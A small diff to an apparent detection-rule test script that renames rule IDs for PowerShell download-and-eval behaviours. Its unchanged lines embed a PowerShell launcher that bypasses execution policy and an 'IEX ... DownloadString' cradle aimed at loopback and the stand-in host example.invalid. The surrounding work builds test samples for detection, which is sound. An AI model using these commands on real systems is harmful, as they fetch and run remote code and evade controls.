@@ -35,9 +35,9 @@ def main():
     parser.add_argument("--beacon", type=Path,
                         help="Optional existing Beacon DLL for a rename control")
     args = parser.parse_args()
-    evaluate = "micro-behaviors/process/deploy::powershell-webclient-download-eval-text"
+    evaluate = "micro-behaviors/process/deploy/script-eval::powershell-webclient-download-eval-text"
     loopback = "micro-behaviors/communications/http/client/managed::loopback-downloadstring-url"
-    command = "micro-behaviors/process/deploy::powershell-loopback-download-eval-command"
+    command = "micro-behaviors/process/deploy/script-eval::powershell-loopback-download-eval-command"
     launch = b"powershell -nop -exec bypass -EncodedCommand '%s'\0"
     local = b"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:8000/')\0"
     remote = local.replace(b"127.0.0.1", b"example.invalid")
